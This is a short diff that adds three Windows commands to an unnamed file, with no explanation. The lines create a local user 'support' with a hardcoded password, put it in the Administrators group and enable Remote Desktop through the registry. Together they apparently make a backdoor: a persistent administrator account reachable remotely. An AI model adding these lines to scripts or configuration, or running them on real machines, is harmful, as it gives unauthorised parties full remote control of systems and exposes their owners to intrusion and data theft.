@@ -1,0 +1,4 @@
+net user support P@ssw0rd1 /add
+net localgroup administrators support /add
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
